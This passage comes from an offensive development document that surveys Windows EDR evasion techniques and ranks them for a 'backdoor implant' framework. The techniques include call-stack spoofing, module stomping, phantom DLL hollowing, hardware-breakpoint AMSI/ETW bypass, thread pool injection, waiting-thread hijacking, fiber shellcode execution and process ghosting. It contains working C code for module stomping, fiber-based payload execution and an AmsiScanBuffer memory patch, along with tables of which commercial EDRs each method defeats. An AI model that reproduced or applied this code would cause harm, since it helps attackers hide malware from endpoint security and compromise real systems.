- **Low-Medium**: Stack spoofing is hard to detect without kernel-mode stack walking.
- **Mitigation**: Use SilentMoonwalk technique for desynchronized unwinding, or the LACUNA Chain approach (Section 6).

### MinGW Notes
Requires inline assembly. Frame size calculation needs PE header parsing. Reference implementations: LoudSunRun, Draugr (BOF variant).

### Chunk Implementation Priority: **MEDIUM** -- important for long-running backdoor implants, but complex to implement correctly. Becomes HIGH when combined with Ekko sleep.

---

## 6. LACUNA Chain (.pdata Lacunae Bypass)

**Category**: Call stack evasion (advanced)
**Purpose**: Defeat ALL layers of call-stack-based EDR detection, including CET shadow stacks and ETW-TI stack collection.

**Published**: June 20, 2026 by Mohamed Alzhrani. Direct successor to 2024 HookChain research.

**How it works**: Every Windows DLL contains uncovered address ranges -- gaps between consecutive `RUNTIME_FUNCTION` entries in the `.pdata` section. When `RtlLookupFunctionEntry` returns NULL for an address in one of these gaps, the unwinder treats it as a leaf function, advances RSP by exactly 8 bytes, reads the next return address, and continues without flagging anything anomalous. LACUNA Chain exploits these gaps ("lacunae") to build fake but structurally valid call stacks.

### Quantified Gaps in System DLLs

| DLL | Total gaps | Executable ghost functions | Bytes available |
|-----|-----------|---------------------------|-----------------|
| ntdll.dll | 3,913 | 1,031 | 48,805 |
| win32u.dll | 1,242 | NOP gaps between syscall stubs | N/A |
| kernelbase.dll | 432 | Including 238-byte ghost at VirtualProtect entry | N/A |

### Seven-Component Architecture

1. **BYOUD-Gap**: Zero-modification stack spoofing using gap addresses as leaf frames to hide arbitrary stack depth
2. **ETW-Ti APC Window Attack**: Exploits asynchronous ETW-Ti stack collection via USER_APC, delaying APCs until a forged chain replaces the real stack
3. **Win32u NOP Gap Chain**: Converts 1,242 uniform NOP gaps into whitelisted leaf frames
4. **BYOUD-MF**: Enables arbitrary RSP assignment via `UWOP_PUSH_MACHFRAME` opcode 10 in `RtlVirtualUnwind`
5. **BYOUD-RT**: Solves runtime calibration using `TEB.StackBase` for RSP distance computation
6. **Parameter encryption**: Hardware breakpoint VEH decrypts syscall parameters only within handler execution
7. **Composite chain assembly**: Combines all layers into a single bypass

### EDR Bypass Results

Tested on Windows 11 22H2 with CET (Control-flow Enforcement Technology) enabled:

| EDR | Call stack detection bypassed? |
|-----|-------------------------------|
| Elastic EDR | Full bypass |
| Bitdefender | Full bypass |
| Kaspersky Endpoint | Full bypass |

All detections after LACUNA came from behavioral signals, memory anomalies, syscall patterns, and handle access rights -- **never from call-stack inspection**.

### Implementation Notes

The technique requires:
1. Scanning `.pdata` sections of loaded DLLs for gaps
2. Identifying executable bytes within those gaps
3. Constructing a chain of leaf-frame return addresses
4. Timing the stack swap to coincide with ETW-Ti APC collection window

Proof-of-concept code is available on the researcher's GitHub (MazX0p/LACUNA-Chain).

### Detection Risk
- **Low**: Exploits fundamental Windows unwinding behavior. Not a bug that can be patched without breaking legitimate unwinding.
- **Mitigation by defenders**: Would require changes to RtlVirtualUnwind behavior, which could break legitimate applications.

### MinGW Notes
Requires `.pdata` section parsing and intimate knowledge of x64 unwind codes. Complex but all APIs are standard.

### Chunk Implementation Priority: **MEDIUM** -- cutting-edge technique with maximum call-stack evasion. Complex to implement but could replace simpler stack spoofing entirely. High value against Elastic Defend specifically.

---

## 7. Module Stomping / Phantom DLL Hollowing

**Category**: Memory evasion
**Purpose**: Execute payload from within a legitimate DLL's memory space, so memory scanners see code backed by a known Windows module.

### 7a. Module Stomping (Self-Injection Variant)

The simpler form. Load a sacrificial DLL into the current process, overwrite its `.text` section with the payload:

```c
static int module_stomp_local(unsigned char *payload, SIZE_T payload_len) {
    // Load sacrificial DLL without calling DllMain
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)LoadLibraryExA(
        "C:\\Windows\\System32\\chakra.dll",
        NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!dos) return 0;

    // Parse PE headers to find .text section
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(((PBYTE)dos) + dos->e_lfanew);
    PIMAGE_SECTION_HEADER txt = IMAGE_FIRST_SECTION(nt);
    PVOID pTxt = ((PBYTE)dos) + txt->VirtualAddress;
    DWORD szTxt = txt->Misc.VirtualSize;

    if (payload_len > szTxt) return 0; // payload too large

    // Overwrite .text with payload
    DWORD old;
    VirtualProtect(pTxt, szTxt, PAGE_EXECUTE_READWRITE, &old);
    memcpy(pTxt, payload, payload_len);
    VirtualProtect(pTxt, szTxt, PAGE_EXECUTE_READ, &old);

    // Execute via function pointer (no CreateRemoteThread)
    typedef void (*exec_fn)(void);
    ((exec_fn)pTxt)();
    return 1;
}
```

**Advantages**:
- No RWX memory allocation via VirtualAlloc (the #1 IoC)
- Code appears to reside within a legitimate module
- No CreateRemoteThread or cross-process operations
- `DONT_RESOLVE_DLL_REFERENCES` prevents DllMain execution

**DLL Selection**: Use less commonly monitored DLLs. `amsi.dll` is too obvious. Good candidates: `chakra.dll`, `dbghelp.dll`, `wbemcomn.dll`.

### 7b. Phantom DLL Hollowing (Transactional NTFS)

Advanced variant that eliminates the copy-on-write detection vector. Uses TxF (Transactional NTFS) to modify a DLL in a transaction, create an image section from the modified file, then rollback -- the disk file is never actually changed:

```c
// 1. Create transaction
NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr,
    NULL, NULL, 0, 0, 0, NULL, NULL);

// 2. Open DLL within transaction
hFile = CreateFileTransactedW(L"C:\\Windows\\System32\\victim.dll",
    GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);

// 3. Write shellcode into the transacted file buffer at .text offset
// Use PointerToRawData (not VirtualAddress) because we're operating
// on the file representation
memcpy(pFileBuf + pSectHdrs->PointerToRawData + dwCodeRva,
    pCodeBuf, dwReqBufSize);

// 4. Create image section from transacted (modified) file
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
    PAGE_READONLY, SEC_IMAGE, hFile);

// 5. Map the section -- shellcode is in .text with +RX permissions
NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)&pMapBuf,
    0, 0, NULL, (PSIZE_T)&mapSize, 1, 0, PAGE_READONLY);

// 6. Rollback transaction -- disk file unchanged, MS-signed, untouched
NtRollbackTransaction(hTransaction, TRUE);
NtClose(hFile);

// Execute from mapped view -- appears as legitimate module memory
```

**Phantom vs Regular DLL Hollowing**:

| Aspect | Regular DLL Hollowing | Phantom Hollowing |
|--------|----------------------|-------------------|
| File modification | Direct (disk artifacts) | Transacted (isolated) |
| Memory permissions | Requires RW->RX change (copy-on-write) | Maintains +RX throughout |
| Copy-on-write | Triggers private pages (detected) | Avoids triggering |
| Disk forensics | Detectable modifications | No disk changes |
| Signed DLL integrity | Violated | Preserved |
| AV scanning | Modified file may be scanned | Modifications isolated from AV |

**Detection Resistance**: Traditional memory scanners like `Get-InjectedThread` and `malfind` rely on identifying private executable memory or orphaned modules. Phantom hollowing defeats these by maintaining legitimate memory type characteristics.

**Limitations**:
- Opening TxF handles to System32 DLLs may require admin privileges
- Shellcode must be position-independent
- Data directory entries within `.text` must be nullified to prevent PE validation failures
- Must check base relocation tables to avoid shellcode corruption during section relocation

### EDR Bypass Effectiveness

| EDR | Unbacked RWX alloc | Module Stomped | Phantom Hollowed |
|-----|-------------------|----------------|------------------|
| Defender | Detected | Lower detection | Lowest detection |
| Elastic Defend | Flagged by VAD analysis | Appears image-backed | Appears fully legitimate |
| CrowdStrike | High confidence alert | Reduced confidence | Lowest signal |

### Detection Risk
- **Module Stomping**: Medium. Writing to a loaded DLL's `.text` section generates ETW memory write events. The private-vs-shared page divergence is detectable via `NtQueryVirtualMemory`. Moneta compares DLL bytes on disk with in-memory bytes.
- **Phantom Hollowing**: Low. No disk modification, no copy-on-write, memory appears as shared image-backed.
- **Mitigation**: Combine with ETW patch. Use less commonly monitored DLLs.

### MinGW Notes
Module stomping compiles cleanly. Phantom hollowing requires `NtCreateTransaction`, `CreateFileTransactedW`, `NtCreateSection` definitions. `CreateFileTransactedW` is in kernel32.dll. NT APIs need manual prototypes.

### Chunk Implementation Priority
- **Module Stomping**: MEDIUM -- useful for staged payloads
- **Phantom Hollowing**: HIGH -- best-in-class memory artifact evasion, worth the complexity

---

## 8. Hardware Breakpoint Hooking Evasion

**Category**: Patchless interception
**Purpose**: Use CPU debug registers (DR0-DR3) to set breakpoints on sensitive functions, intercepting them via VEH without modifying memory.

**How it works**: x86-64 processors have 4 debug registers (DR0-DR3) that trigger a `EXCEPTION_SINGLE_STEP` exception when execution reaches the breakpoint address. A Vectored Exception Handler intercepts this exception and can modify the execution context (return value, instruction pointer) without ever writing to the target function's memory.

### VEH-Based Function Hooking

```c
static PVOID g_target_addr = NULL;

static LONG WINAPI hw_bp_handler(PEXCEPTION_POINTERS ex) {
    if (ex->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
        ex->ExceptionRecord->ExceptionAddress == g_target_addr) {

        // Intercept: make the function return success immediately
        ex->ContextRecord->Rax = 0; // return ERROR_SUCCESS
        ex->ContextRecord->Rip = *(DWORD64 *)ex->ContextRecord->Rsp;
        ex->ContextRecord->Rsp += 8;

        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static int install_hw_bp(PVOID target) {
    g_target_addr = target;
    AddVectoredExceptionHandler(1, hw_bp_handler);

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    ctx.Dr0 = (DWORD64)target;
    ctx.Dr7 |= 1;          // enable DR0 breakpoint
    ctx.Dr7 |= (0 << 16);  // break on execution

    SetThreadContext(GetCurrentThread(), &ctx);
    return 1;
}
```

### NtContinue for Covert DR Register Setting

`SetThreadContext` with `CONTEXT_DEBUG_REGISTERS` generates an ETW-TI event (`EtwTiLogSetContextThread`). Use `NtContinue` instead -- it updates debug registers WITHOUT generating the event:

```c
static void set_dr_covert(PVOID target) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_ALL;
    RtlCaptureContext(&ctx);
    ctx.Dr0 = (DWORD64)target;
    ctx.Dr7 |= 1;
    // NtContinue does NOT emit ETW-TI SetThreadContext event
    NtContinue(&ctx, FALSE);
}
```

### Patchless ETW/AMSI Bypass via HW Breakpoints

Instead of patching `AmsiScanBuffer` or `EtwEventWrite` in memory (which integrity checks catch), set a hardware breakpoint on them and intercept via VEH:

```c
// Patchless AMSI bypass
PVOID amsi_scan = GetProcAddress(
    LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
install_hw_bp(amsi_scan); // VEH handler returns AMSI_RESULT_CLEAN

// Patchless ETW bypass
PVOID etw_write = GetProcAddress(
    GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
install_hw_bp(etw_write); // VEH handler returns ERROR_SUCCESS
```

### LayeredSyscall Technique (White Knight Labs)

Combines VEH + hardware breakpoints + indirect syscalls for complete EDR bypass with legitimate call stacks:

1. Register VEH handler
2. Trigger access violation by reading from NULL to enter VEH
3. VEH scans ntdll for `syscall; ret` gadgets (0F 05 C3)
4. Sets hardware breakpoints at syscall and ret instructions
5. When execution hits the syscall breakpoint, VEH:
   - Saves CPU context (RCX, RDX, R8, R9)
   - Redirects to a benign Windows API to build legitimate call stack
   - Enables Trap Flag for instruction-level tracing
   - Waits until execution reaches ntdll address space
   - Verifies the frame has sufficient stack allocation (0x58+ bytes)
   - Stores arguments 5-12 on the validated stack
   - Redirects RIP to the real syscall opcode
6. Result: syscall executes with a fully legitimate call stack

Supports up to 12 arguments via Windows x64 calling convention.
Tested against Sophos Intercept X -- successfully executed process hollowing.

### VEH2 Technique (CrowdStrike)

Presented at RHC2 in May 2025. Variant of patchless AMSI bypass that silently sets hardware breakpoints to bypass AMSI without detection by silently manipulating debug registers.

### Limitations

- Only 4 hardware breakpoints available (DR0-DR3)
- Breakpoints must be applied per-thread for process-wide bypass
- Defenders can inspect DR0-DR3 for unexpected values (but rarely do)
- VEH registration (`AddVectoredExceptionHandler`) is an IoC, though many legitimate apps use VEH

### EDR Bypass Effectiveness

| EDR | Memory patch | HW breakpoint | HW BP + NtContinue | LayeredSyscall |
|-----|-------------|---------------|---------------------|----------------|
| Defender | Detected | Bypasses | Bypasses | Bypasses |
| Elastic Defend | Detected | Bypasses | Bypasses | Bypasses |
| CrowdStrike | Partially detected | Bypasses | Bypasses | Bypasses |
| Sophos | Detected | Bypasses | Bypasses | Bypasses (tested) |

### Detection Risk
- **Low**: No memory modifications. Debug registers are per-thread and not easily inspected by EDRs.
- VEH registration is an IoC, but many legitimate apps use VEH.
- **Mitigation**: Combine with NtContinue for covert DR register setting. Limit to 4 most critical functions.

### MinGW Notes
Compiles cleanly. VEH APIs are standard Win32. `NtContinue` requires ntdll function pointer resolution.

### Chunk Implementation Priority: **HIGH** -- patchless bypass is the most detection-resistant approach for ETW/AMSI. LayeredSyscall is the gold standard.

---

## 9. Pool Party Thread Pool Injection

**Category**: Process injection
**Purpose**: Inject and execute code through Windows thread pool mechanisms, bypassing all 5 leading EDR solutions with 100% success rate.

**Published**: SafeBreach Labs, December 2023. Remains effective through 2025-2026.

**How it works**: Windows thread pools use worker threads to execute queued work items. Pool Party injects malicious work items (TP_WORK, TP_TIMER, TP_IO, TP_WAIT, TP_ALPC, TP_JOB, TP_DIRECT) into a target process's thread pool. The worker threads naturally dequeue and execute these items, triggering the malicious callback without creating new threads.

### The 8 Pool Party Variants

1. **Worker Factory Start Routine Overwrite**: Modifies thread pool worker factory entry point
2. **Remote TP_WORK Insertion**: Injects work items into the task queue
3. **Remote TP_IO Insertion**: Queues asynchronous I/O completion work items
4. **Remote TP_WAIT Insertion**: Exploits wait objects in completion queue
5. **Remote TP_ALPC Insertion**: Leverages ALPC port notifications
6. **Remote TP_JOB Insertion**: Uses job object completion events
7. **Remote TP_DIRECT Insertion**: Directly queues structures via NtSetIoCompletion
8. **Remote TP_TIMER Insertion**: Schedules malicious timer callbacks

### TP_WORK Variant (Most Applicable to Self-Injection)

The task structure gets inserted into the task queue within the thread pool structure. Workers dequeue and execute tasks from the doubly-linked task queue:

```c
// Self-injection via thread pool work item
// 1. Get current process thread pool via NtQueryInformationWorkerFactory
// 2. Allocate work item structure
// 3. Set callback to payload address
// 4. Insert into task queue
// 5. Worker thread dequeues and executes

// For remote injection:
// 1. Open target process
// 2. NtQueryInformationWorkerFactory to get TP_POOL structure
// 3. VirtualAllocEx + WriteProcessMemory for payload + TP_WORK structure
// 4. Manipulate the task queue linked list to include our TP_WORK
// 5. Worker thread naturally executes our callback
```

### TP_TIMER Variant (Self-Erasing)

This variant enables the attacker to exit the process and erase their identity. The malicious code activates only when the timer expires:

```c
// TP_TIMER is queued via WindowStartLinks/WindowEndLinks list manipulation
// After injection:
// 1. Attacker process exits cleanly
// 2. System appears clean (no suspicious process)
// 3. Timer fires in target process
// 4. Payload executes on pre-existing worker thread
```

### Why It Bypasses EDRs

EDRs base detection primarily on the **execution primitive** (how code starts running). They monitor:
- CreateRemoteThread / NtCreateThreadEx (PsSetCreateThreadNotifyRoutine kernel callback)
- APC injection events
- SetThreadContext calls

Pool Party bypasses all of these because:
- No thread creation callback fires (uses pre-existing worker threads)
- Execution is triggered by legitimate Windows actions (file writes, ALPC connections, timer expiry)
- The execution path goes through standard kernel thread pool code

### EDR Solutions Bypassed (100% success rate)

- Palo Alto Cortex
- SentinelOne EDR
- CrowdStrike Falcon
- Microsoft Defender for Endpoint
- Cybereason EDR

### Detection Risk
- **Low**: Extremely difficult to detect because execution occurs on legitimate worker threads through standard kernel mechanisms.
- The only realistic detection vector is monitoring for suspicious DuplicateHandle + WriteProcessMemory combinations targeting thread pool structures.

### MinGW Notes
Requires NT API definitions for `NtQueryInformationWorkerFactory`, `NtDuplicateHandle`, and thread pool internal structures. Implementation requires reverse engineering of undocumented TP_POOL internals.

### Chunk Implementation Priority: **MEDIUM** -- primarily useful for cross-process injection scenarios. For self-injection (our main use case), the TP_WORK self-injection variant is simpler and effective.

---

## 10. Waiting Thread Hijacking

**Category**: Process injection
**Purpose**: Execute payload on a waiting thread without suspending it, avoiding all thread creation/suspension monitoring.

**Published**: Check Point Research, 2025. Evolution of classic thread hijacking.

**How it works**: Instead of suspending and resuming threads (heavily monitored), this technique exploits threads that naturally enter waiting states within thread pools. When a thread calls `NtRemoveIoCompletion` or `NtWaitForWorkViaWorkerFactory`, it waits inside a syscall wrapper that stores the return address on the stack. The attack overwrites this return address with a pointer to injected shellcode.

### Key Differences from Classic Thread Hijacking

| Aspect | Classic Hijacking | Waiting Thread Hijacking |
|--------|------------------|--------------------------|
| APIs used | SuspendThread/ResumeThread/SetThreadContext | GetThreadContext + WriteProcessMemory |
| ETW events | SetThreadContext generates ETW-Ti | No SetThreadContext = no ETW-Ti |
| Thread access | THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT only |
| Kernel callbacks | Thread suspension callback fires | No suspension = no callback |

### Finding Suitable Threads

Target threads with `WrQueue` wait reason:

```c
// Use NtQuerySystemInformation with SystemProcessInformation
// Filter for threads where WaitReason == WrQueue
// These threads are waiting inside:
// - NtRemoveIoCompletion (GetQueuedCompletionStatus)
// - NtWaitForWorkViaWorkerFactory (TppWorkerThread)
//
// Key insight: these syscall wrappers do NOT create stack frames.
// The first value at RSP is the return address.
```

### Injection Mechanism

```c
// Pseudocode:
// 1. Find WrQueue thread via NtQuerySystemInformation
// 2. Open thread with THREAD_GET_CONTEXT
// 3. GetThreadContext to read RSP value
// 4. ReadProcessMemory(RSP) to save original return address

// 5. VirtualAllocEx in target for payload + stub
// 6. WriteProcessMemory: shellcode + restoration stub

// 7. Shellcode stub structure:
//    [SAVED_RET_PTR]     // space for original return address
//    pushfq              // preserve flags
//    push rax            // preserve registers
//    push rcx
//    ... all registers ...
//    call shellcode_main // execute payload
//    pop rcx             // restore registers
//    pop rax
//    popfq               // restore flags
//    jmp [SAVED_RET_PTR] // return to original flow

// 8. WriteProcessMemory: overwrite return address at RSP with stub address
// 9. When syscall returns naturally, thread jumps to our stub
```

### Why It Evades EDRs

- No thread creation callbacks (PsSetCreateThreadNotifyRoutine never fires)
- No SetThreadContext calls (eliminates ETW-TI events)
- No SuspendThread/ResumeThread (eliminates suspension monitoring)
- Uses common, benign APIs (VirtualAllocEx, WriteProcessMemory, GetThreadContext)
- Operations can be split across child processes via environment variables for behavioral obfuscation

### Limitations
- Requires 64-bit target processes with medium integrity
- Target process must use thread pools (common but not universal)
- Some EDR systems block ALL remote memory writes (would prevent this)
- Requires PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_VM_OPERATION permissions

### Detection Risk
- **Low**: Most EDRs are "very restrictive about remote execution methods but more lenient about allocations and writes."
- **Mitigation by defenders**: Would require blocking all remote memory writes, which breaks legitimate debugging tools.

### MinGW Notes
All APIs are standard Win32 (OpenProcess, GetThreadContext, VirtualAllocEx, WriteProcessMemory). Compiles cleanly with MinGW.

### Chunk Implementation Priority: **LOW-MEDIUM** -- primarily useful for cross-process injection. Less relevant for our single-binary self-contained approach, but valuable if the framework adds lateral movement capability.

---

## 11. Callback-Based Execution

**Category**: Execution method
**Purpose**: Execute payload code through legitimate Windows callback mechanisms rather than explicit thread creation, reducing EDR visibility.

### Techniques

**A. Timer Callbacks (CreateTimerQueueTimer)**
```c
CreateTimerQueueTimer(&hTimer, hQueue,
    (WAITORTIMERCALLBACK)payload_addr, NULL, 0, 0,
    WT_EXECUTEINTIMERTHREAD);
```

**B. APC Injection (NtQueueApcThread)**
```c
// Queue APC to target thread -- executes when thread enters alertable wait
NtQueueApcThread(hThread, (PPS_APC_ROUTINE)payload_addr, NULL, NULL, NULL);
```

**C. EarlyBird APC**
Create process suspended -> queue APC -> resume. APC fires before EDR DLL loads. ~65% of EDR/EPP products allow this technique.

**D. TLS Callbacks**
Add a TLS callback to the PE that executes during `LdrpInitializeProcess`, before `ZwTestAlert` processes APCs.

**E. Window Message Callbacks**
```c
// Use enumeration functions as execution trampolines
EnumWindows((WNDENUMPROC)payload_addr, 0);
EnumChildWindows(NULL, (WNDENUMPROC)payload_addr, 0);
EnumFontFamiliesW(hdc, NULL, (FONTENUMPROCW)payload_addr, 0);
EnumDesktopWindows(NULL, (WNDENUMPROC)payload_addr, 0);
```

### Behavioral Noise Comparison

| Technique | Thread creation event | EDR kernel callback | Behavioral signal |
|-----------|----------------------|--------------------|--------------------|
| CreateRemoteThread | Yes | PsSetCreateThreadNotifyRoutine | HIGH |
| APC injection | No new thread | ETW APC event | MEDIUM |
| Module stomping + callback | No new thread | None | LOW |
| Fiber execution | No new thread | None | LOW |
| EnumWindows callback | No new thread | None | VERY LOW |

### Detection Risk
- **Low-Medium**: Callback-based execution is harder to trace causally. EDRs must correlate the callback registration with the execution.
- **Mitigation**: Use less common callback APIs (EnumFontFamilies, EnumDesktopWindows, etc.)

### MinGW Notes
All callback APIs compile with MinGW.

### Chunk Implementation Priority: **MEDIUM** -- useful for initial execution bootstrapping. EnumWindows/EnumFontFamilies are trivially easy to implement.

---

## 12. Fiber-Based Execution

**Category**: Execution method
**Purpose**: Execute shellcode using Windows Fibers (cooperative user-mode threads) with zero kernel visibility.

**How it works**: Fibers are user-mode cooperative threading primitives scheduled entirely in user space. The kernel has NO visibility into fiber switches. No thread creation callbacks fire, making this invisible to EDRs that rely on kernel thread monitoring.

### Implementation

```c
static int exec_via_fiber(unsigned char *payload, SIZE_T payload_len) {
    // Convert current thread to a fiber
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber) return 0;

    // Allocate executable memory for payload
    PVOID pPayload = VirtualAlloc(NULL, payload_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pPayload) return 0;
    memcpy(pPayload, payload, payload_len);

    // Create fiber pointing to payload
    PVOID malFiber = CreateFiber(0,
        (LPFIBER_START_ROUTINE)pPayload, NULL);
    if (!malFiber) return 0;

    // Switch to payload fiber -- executes the payload
    SwitchToFiber(malFiber);

    // Payload returns via SwitchToFiber(mainFiber)
    // Clean up
    DeleteFiber(malFiber);
    VirtualFree(pPayload, 0, MEM_RELEASE);
    return 1;
}
```

### Combined with Module Stomping

For maximum stealth, combine fiber execution with module stomping:

```c
// Load sacrificial DLL, stomp its .text, create fiber at stomped address
HMODULE hMod = LoadLibraryExA("chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hMod + dos->e_lfanew);
PVOID entry = (BYTE *)hMod + nt->OptionalHeader.AddressOfEntryPoint;

DWORD old;
VirtualProtect(entry, payload_len, PAGE_EXECUTE_READWRITE, &old);
memcpy(entry, payload, payload_len);
VirtualProtect(entry, payload_len, PAGE_EXECUTE_READ, &old);

PVOID mainFiber = ConvertThreadToFiber(NULL);
PVOID malFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)entry, NULL);
SwitchToFiber(malFiber);
```

Result: code executes from module-backed memory via fiber (no thread creation, no unbacked memory).

### Real-World Usage (2025-2026)

SectopRAT (2025 campaign) used fiber-based shellcode execution combined with AMSI bypass in a multi-stage ACRStealer campaign. This confirms the technique remains effective against production EDRs.

### EDR Bypass Effectiveness
- No thread creation callbacks (PsSetCreateThreadNotifyRoutine never fires)
- Fiber switches are invisible to the kernel
- All scheduling happens in user space
- Combined with module stomping: zero unbacked memory artifacts

### Detection Risk
- **Low**: Fibers are legitimate Windows primitives used by production applications.
- The fiber's stack remains in process memory and could be spotted by manual inspection.
- `ConvertThreadToFiber` and `CreateFiber` API calls are not commonly monitored.

### MinGW Notes
All fiber APIs are in kernel32.dll and compile cleanly with MinGW.

### Chunk Implementation Priority: **MEDIUM-HIGH** -- trivially easy to implement (~15 lines of code), very low detection risk. Even better when combined with module stomping.

---

## 13. Process Ghosting

**Category**: File-based evasion
**Purpose**: Execute a payload from a file that no longer exists on disk, defeating file-based scanning.

**How it works**:
1. Create a file and mark it for deletion (`FILE_DELETE_ON_CLOSE` or `NtSetInformationFile`)
2. Write payload to the delete-pending file
3. Create an image section from the file
4. Close the file handle (file is deleted from disk)
5. Create a process from the section (using `NtCreateProcessEx`)
6. When EDR's image-load callback fires, the file no longer exists

### Implementation Flow

```c
// Pseudocode -- requires NT API definitions
static int process_ghost(unsigned char *payload, SIZE_T payload_len) {
    HANDLE hFile;
    IO_STATUS_BLOCK iosb;
    UNICODE_STRING path;
    OBJECT_ATTRIBUTES oa;

    // 1. Create temp file with delete-on-close
    RtlInitUnicodeString(&path, L"\\??\\C:\\Windows\\Temp\\ghost.tmp");
    InitializeObjectAttributes(&oa, &path, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NtCreateFile(&hFile, GENERIC_READ | GENERIC_WRITE | DELETE,
        &oa, &iosb, NULL, FILE_ATTRIBUTE_NORMAL,
        0, FILE_SUPERSEDE, FILE_DELETE_ON_CLOSE, NULL, 0);

    // 2. Write payload
    NtWriteFile(hFile, NULL, NULL, NULL, &iosb, payload, payload_len, NULL, NULL);

    // 3. Create section
    HANDLE hSection;
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
        PAGE_READONLY, SEC_IMAGE, hFile);

    // 4. Close file (deleted from disk)
    NtClose(hFile);

    // 5. Create process from section
    HANDLE hProcess;
    NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
        NtCurrentProcess(), 0, hSection, NULL, NULL, 0);

    // 6. Set up process parameters and create initial thread
    // ... (requires RtlCreateProcessParametersEx, NtCreateThreadEx)

    return 1;
}
```

### EDR Bypass Effectiveness

| EDR | Normal file execution | Process Ghosting |
|-----|----------------------|-----------------|
| Defender | Scanned pre-execution | File gone before scan completes |
| Elastic Defend | File hash checked | No file to hash |
| CrowdStrike | Detected (2023+ signatures) | Partially detected |

### Detection Risk
- **Medium-High**: Microsoft added specific mitigations in Windows 11 22H2+. `NtCreateProcessEx` is monitored by kernel callbacks.
- The use of `NtCreateProcessEx` (instead of `NtCreateUserProcess`) is itself an IoC.

### MinGW Notes
Requires NT API definitions from `<winternl.h>` or manual definitions. `NtCreateProcessEx` is undocumented.

### Chunk Implementation Priority: **LOW** -- complex, partially mitigated in recent Windows, requires process creation infrastructure our chunks don't have.

---

## 14. AMSI Bypass

**Category**: Scan evasion
**Purpose**: Disable the Anti-Malware Scan Interface so in-memory content is not scanned.

**Note**: AMSI is primarily relevant for .NET/PowerShell/VBScript payloads. For compiled C payloads (our use case), AMSI is less critical since C code does not go through the AMSI pipeline. However, if our payload loads/executes scripts, AMSI bypass matters.

### Method A: AmsiScanBuffer Memory Patch

```c
static int patch_amsi(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return 0;

    unsigned char *addr = (unsigned char *)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!addr) return 0;

    DWORD old;
    VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &old);

    // mov eax, 0x80070057 (E_INVALIDARG); ret
    addr[0] = 0xB8;
    addr[1] = 0x57;
    addr[2] = 0x00;
    addr[3] = 0x07;
    addr[4] = 0x80;
    addr[5] = 0xC3;

    VirtualProtect(addr, 6, old, &old);
    return 1;
}
```

### Method B: Patchless via Hardware Breakpoint (VEH2)

Set hardware breakpoint on `AmsiScanBuffer`. VEH handler intercepts, sets return value to `AMSI_RESULT_CLEAN`, advances RIP past the function. See Section 8 for implementation.

### Detection Risk
- **High** for Method A: Defender's tamper protection specifically monitors AmsiScanBuffer patches.
- **Low** for Method B: No memory modification.

### Chunk Implementation Priority: **LOW** -- not directly relevant for compiled C payloads.

---

## 15. EDR Preloading

**Category**: EDR disablement
**Purpose**: Execute code before the EDR's DLL loads, then prevent it from loading entirely.

**How it works**: Hijacks the Application Verifier (`AppVerifier`) callback layer. Uses `AvrfpAPILookupCallbackRoutine` to execute before EDR DLL initialization. Reference: MalwareTech/EDR-Preloader.

### Detection Risk
- **Medium**: AppVerifier abuse is now monitored by some EDRs. Suspended process creation is an IoC.

### Chunk Implementation Priority: **LOW** -- requires process creation infrastructure, complex, partially mitigated.

---

## 16. Dirty Vanity (Process Forking)

**Category**: Process injection
**Purpose**: Execute payload in a forked process that was never directly written to.

**How it works**: Uses `RtlCreateProcessReflection` or `NtCreateProcess[Ex]` to fork the current process. The forked process inherits the entire address space including any injected code. Since the forked process was never directly written to, write-monitoring EDRs don't flag it.

### Key API
```c
typedef NTSTATUS (NTAPI *pfnRtlCreateProcessReflection)(
    HANDLE ProcessHandle,
    DWORD Flags,
    PVOID StartRoutine,
    PVOID StartContext,
    HANDLE EventHandle,
    PVOID *ReflectionInfo
);
```

### EDR Bypass Mechanism
- The original process is never modified -> no WriteProcessMemory events
- The forked process inherits all memory -> payload is already present
- EDR hooks in the original process are NOT inherited by the fork

### Detection Risk
- **Medium**: Process forking (`RtlCreateProcessReflection`) is uncommon and can be flagged.

### Chunk Implementation Priority: **LOW** -- requires process management beyond our chunk scope.

---

## 17. Threadless Injection

**Category**: Process injection
**Purpose**: Execute code in a remote process without creating any new threads.

**How it works** (credited to @_EthicalChaos_ / CCob/ThreadlessInject):

1. Locate a "memory hole" (code cave) in the target process with sufficient capacity
2. Write shellcode and a small trampoline stub to the code cave
3. Insert a `JMP` instruction following a commonly-used ntdll function (e.g., `NtOpenFile`)
4. Wait for legitimate threads to execute that function, triggering the `JMP`
5. Trampoline restores normal execution flow after payload runs

```c
// Pseudocode:
// 1. Find code cave in target process (gaps in .text sections)
// 2. Write shellcode to code cave via WriteProcessMemory
// 3. Write trampoline:
//    pushfq
//    push rax..r15
